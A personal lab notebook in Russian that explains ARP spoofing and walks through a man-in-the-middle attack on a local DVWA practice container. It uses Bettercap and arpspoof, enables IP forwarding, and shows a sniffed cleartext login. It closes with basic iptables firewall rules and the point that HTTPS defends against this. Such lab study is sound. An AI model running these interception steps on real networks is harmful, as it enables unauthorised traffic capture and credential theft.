## ARP Spoofing — теория

### Как работает ARP (нормально)

ARP (Address Resolution Protocol) — протокол уровня 2 OSI.
Переводит IP адрес в MAC адрес внутри локальной сети.

```
Компьютер: "Кто имеет IP 192.168.1.1? Ответь мне!" (broadcast)
Роутер:    "Это я! Мой MAC: aa:bb:cc:dd:ee:ff"
Компьютер: запоминает в ARP таблицу и отправляет пакеты роутеру
```

Проблема: ARP не имеет аутентификации — любой может ответить на любой запрос!

### Как работает ARP Spoofing (атака)

```
Жертва (172.17.0.2)  ←→  Атакующий (172.17.0.1)  ←→  Роутер/Шлюз
                              ↑
                    Встаёт посередине!
                    Говорит жертве: "Я роутер"
                    Говорит роутеру: "Я жертва"
                    Весь трафик идёт через атакующего
```

Это классический **Man-in-the-Middle (MitM)**. Жертва ничего не замечает — интернет работает как обычно.

## Команды которые использовал сегодня

### Подготовка сети

```bash
ip a
# Показывает все сетевые интерфейсы и IP адреса
# Нашёл: eth0 = 10.0.2.15, docker0 = 172.17.0.1

ip route | grep default
# ip route — таблица маршрутизации
# grep default — фильтр только строки со шлюзом
# Нашёл: шлюз 10.0.2.2

echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
# Включает пересылку пакетов между интерфейсами
# Без этого: пакеты жертвы приходят но не пересылаются дальше
# Жертва теряет интернет и замечает атаку!
```

### Docker команды

```bash
sudo systemctl start docker
# Запускает службу Docker
# systemctl = менеджер служб Linux

sudo docker start $(sudo docker ps -aq)
# docker ps -aq = ID всех контейнеров (включая остановленные)
# $(...) = подстановка — сначала выполняется внутри, результат подставляется
# docker start = запускает контейнер по ID

sudo docker ps
# Показывает запущенные контейнеры
# Увидел: DVWA, статус Up, порт 80→80

sudo docker inspect $(sudo docker ps -q) | grep IPAddress
# Получает подробную информацию о контейнере
# grep IPAddress = фильтрует только строку с IP
# Нашёл: DVWA = 172.17.0.2
```

### Bettercap команды

```bash
sudo bettercap -iface docker0
# Запускает Bettercap на интерфейсе docker0
# -iface = указывает сетевой интерфейс
# docker0 = интерфейс Docker сети

# Внутри Bettercap:
net.probe on
# Сканирует сеть через ARP запросы
# Находит все живые устройства

net.show
# Показывает таблицу найденных устройств
# IP, MAC, производитель, трафик

set arp.spoof.fullduplex true
# Двусторонний ARP Spoofing
# Обманываем и жертву И шлюз
# Без этого трафик идёт только в одну сторону

set arp.spoof.targets 172.17.0.2
# Устанавливает цель атаки — DVWA контейнер

arp.spoof on
# Запускает атаку — рассылает поддельные ARP пакеты
# Говорит жертве: "Я роутер"
# Говорит роутеру: "Я жертва"

net.sniff on
# Перехватывает и анализирует трафик
# Показывает HTTP запросы, cookie, пароли
```

### arpspoof (альтернатива)

```bash
sudo apt install dsniff -y
# Устанавливает пакет dsniff
# -y = автоматически отвечать "да"

sudo arpspoof -i docker0 -t 172.17.0.2 172.17.0.1
# -i docker0 = интерфейс
# -t 172.17.0.2 = жертва
# 172.17.0.1 = IP за который притворяемся (шлюз)
# Говорим жертве: "IP 172.17.0.1 это мой MAC!"
```

## Результат атаки — перехваченный пароль

В Wireshark (Follow TCP Stream) увидел:

```
POST /login.php HTTP/1.1
Host: 172.17.0.2
...
username=admin&password=password&Login=Login
```

**Логин и пароль в открытом виде!** Это возможно потому что DVWA работает по HTTP без шифрования.

### Почему HTTPS защищает:
- HTTP: данные летят открытым текстом → MitM видит всё
- HTTPS: данные зашифрованы → MitM видит только зашифрованный мусор

## iptables — базовый Firewall

### Три цепочки:

| Цепочка | Что контролирует |
|---|---|
| INPUT | Пакеты которые приходят К твоему компьютеру |
| OUTPUT | Пакеты которые уходят ОТ твоего компьютера |
| FORWARD | Пакеты которые проходят ЧЕРЕЗ компьютер (как роутер) |

### Три действия:

| Действие | Что делает |
|---|---|
| ACCEPT | Пропустить пакет |
| DROP | Молча выбросить (отправитель не знает) |
| REJECT | Выбросить и сообщить об ошибке отправителю |

### Команды iptables:

```bash
sudo iptables -L -v
# -L = list (показать все правила)
# -v = verbose (подробно с счётчиками пакетов)

sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
# -A INPUT = добавить в цепочку INPUT
# -p tcp = протокол TCP
# --dport 22 = destination port 22 (SSH)
# -j ACCEPT = действие: принять

sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
# Разрешить HTTP (порт 80)

sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT
# Разрешить HTTPS (порт 443)

sudo iptables -A INPUT -i lo -j ACCEPT
# -i lo = интерфейс loopback (127.0.0.1)
# Разрешить localhost трафик (нужен для работы системы)

sudo iptables -A INPUT -j DROP
# Заблокировать ВСЁ остальное
# Ставится ПОСЛЕДНИМ — первое совпадение срабатывает

sudo iptables -L -v --line-numbers
# --line-numbers = показать номера правил
# Удобно для удаления конкретного правила

sudo iptables -F
# F = flush (очистить)
# Удаляет все правила — сброс к начальному состоянию
```

### Порядок правил КРИТИЧЕН:

```
Правило 1: ACCEPT порт 22  ← SSH разрешён
Правило 2: ACCEPT порт 80  ← HTTP разрешён
Правило 3: ACCEPT порт 443 ← HTTPS разрешён
Правило 4: ACCEPT lo       ← Localhost разрешён
Правило 5: DROP all        ← Всё остальное заблокировано
```

Если поставить DROP первым — заблокируешь всё включая SSH!
